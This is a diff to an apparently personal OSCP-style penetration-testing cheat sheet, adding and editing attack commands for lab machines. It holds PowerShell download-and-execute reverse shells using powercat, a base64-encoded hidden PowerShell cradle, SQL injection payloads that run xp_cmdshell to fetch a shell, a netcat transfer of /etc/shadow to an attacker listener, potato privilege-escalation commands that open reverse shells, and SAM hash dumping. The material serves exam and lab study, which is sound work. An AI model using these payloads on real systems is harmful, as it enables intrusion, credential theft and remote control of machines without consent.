@@ -14,6 +14,9 @@
   - [SQLi](#sqli)
  
 - [Tools](#tools)
+  - [netcat](#netcat)
+  - [tcpdump](#tcpdump)
+  - [cmd](#cmd)
   - [smbpasswd](#smbpasswd)
   - [awk](#awk)
   - [samrdump](#samrdump)
@@ -275,6 +278,7 @@ http://dev.siteisup.htb/?page=phar://uploads/ac5052094c12a761f080438aeb6c9634/pr
 
 # Powershell: w powercat
 IEX(New-Object System.Net.Webclient).DownloadString("http://192.168.45.176/powercat.ps1");powercat -c 192.168.45.176 -p 4444 -e powershell
+powershell.exe -nop -w hidden -c "IEX ((New-Object Net.WebClient).DownloadString(''http://192.168.45.202/powercat.ps1''))";powercat -c 192.168.45.202 -p 443 -e powershell
 
 # when executing with base64 encoded
 powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADEANwA2AC8AcABvAHcAZQByAGMAYQB0AC4AcABzADEAIgApADsAcABvAHcAZQByAGMAYQB0ACAALQBjACAAMQA5ADIALgAxADYAOAAuADQANQAuADEANwA2ACAALQBwACAANAA0ADQANAAgAC0AZQAgAHAAbwB3AGUAcgBzAGgAZQBsAGwACgA=
@@ -666,11 +670,12 @@ sqlitebrowser ma.db
 ';RECONFIGURE;--
 ';EXEC sp_configure "xp_cmdshell", 1;--
 ';RECONFIGURE;--
-';EXEC xp_cmdshell 'powershell.exe -nop -w hidden -c "IEX ((New-Object Net.WebClient).DownloadString(''http://192.168.45.176/powercat.ps1''))"; powercat -c 192.168.45.176 -p 4444 -e powershell'; --
+';EXEC xp_cmdshell 'powershell.exe -nop -w hidden -c "IEX ((New-Object Net.WebClient).DownloadString(''http://192.168.45.202/powercat.ps1''))"; powercat -c 192.168.45.202 -p 443 -e powershell'; --
 
-or
-sudo Responder -I tun0 -A
+or if we think the hash can be cracked...?
+sudo responder -I tun0 -A
 ';EXEC xp_dirtree \\192.168.45.176\share
+';EXEC%20xp_dirtree%20'\\192.168.45.202\share';--
 EXEC MASTER.sys.xp_dirtree '\\10.10.14.19\share', 1, 1
 
 or
@@ -744,6 +749,36 @@ cast((SELECT data_column FROM data_table LIMIT 1 OFFSET data_offset) as int)
 ```
 
 ## Tools
+### netcat
+```bash
+# file transfer
+1. fire up netcat listener on our attack kali machine
+nc -lvnp 4444 > copiedNetcatShadow.txt
+2. send the file from victim machine!
+nc 192.168.48.3 4444 < /etc/shadow
+
+
+```
+
+### tcpdump
+```bash
+# filter port 53
+sudo tcpdump -i ens192 udp port 53
+```
+
+### cmd
+```bash
+# Using Where
+## calc.exe works because system32 folder is in our environment variable path
+C:\Users\student\Desktop>where calc.exe
+C:\Windows\System32\calc.exe
+
+# Recursive Where
+where /R C:\Users\student\ bio.txt
+where /R C:\Users\student\ *.csv
+
+```
+
 ### smbpasswd
 ```bash
 # If we got "STATUS_PASSWORD_MUST_CHANGE" for some users, we can update a current password to a new one.
@@ -1256,6 +1291,10 @@ wget -O - http://192.168.45.175:443/lse.sh | bash
 
 ### SCP
 ```bash
+# on our kali attack machine, we're using victim machine's user stuart username and password!
+scp stuart@192.168.250.144:/opt/backup/sitebackup3.zip sitebackup3.zip 
+stuart@192.168.250.144's password: 
+
 scp linenum.sh user@remotehost:/tmp/linenum.sh
 ```
 
@@ -1402,6 +1441,7 @@ sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
 **secretsdump**
 ```bash
 impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
+impacket-secretsdump -sam SAM -system SYSTEM LOCAL
 ```
 
 **Grab sid**
@@ -1633,7 +1673,7 @@ nc -nlvp 6666
 ```bash
 iwr -uri http://192.168.45.176/PrintSpoofer64.exe -Outfile PrintSpoofer.exe
 iwr -uri http://192.168.45.176/nc.exe -Outfile nc.exe
-.\PrintSpoofer.exe -c "C:\TEMP\nc.exe 192.168.45.176 1337 -e cmd"
+.\PrintSpoofer.exe -c "C:\temp\nc.exe 192.168.45.202 443 -e cmd"
 ```
 
 ### RoguePotato
@@ -1653,9 +1693,10 @@ iwr -uri http://192.168.45.176/reverse.exe -Outfile reverse.exe
 ### GodPotato
 ```bash
 Windows Privesc: God Potato(https://github.com/BeichenDream/GodPotato)
+.\GodPotato.exe -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.45.202 7777"
 .\GodPotato.exe -cmd "cmd /c whoami"
 .\GodPotato.exe -cmd ".\revshell7777.exe"
-.\GodPotato.exe -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.45.176 7777"
+
 ```
 ### mimikatz
 ```bash
@@ -1708,13 +1749,18 @@ psexec.py Administrator@dc1.corp.com -k -no-pass
 ```
 
 ### chisel
+![image](https://github.com/nuricheun/OSCP/assets/14031269/38af9dc8-b526-486d-871a-a75ed0fe8f87)
+
 ```bash
 #chisel
 #Run command on attacker machine
 chisel server -p 8888 --reverse
 #<socks>Run command on Web Server machine
  .  .\chisel.exe client <% tp.frontmatter["LHOST"] %>:8001 R:1080:socks
-and edit the proxychains with the port that chisel provided
+# and edit the proxychains with the port that chisel provided
+/etc/proxychains.conf
+socks5 127.0.0.1 1080
+
 
 #When trying to connect to a local port
 C:\\xampp\\htdocs>.\\chisel.exe client 192.168.45.176:8888 R:8090:localhost:80
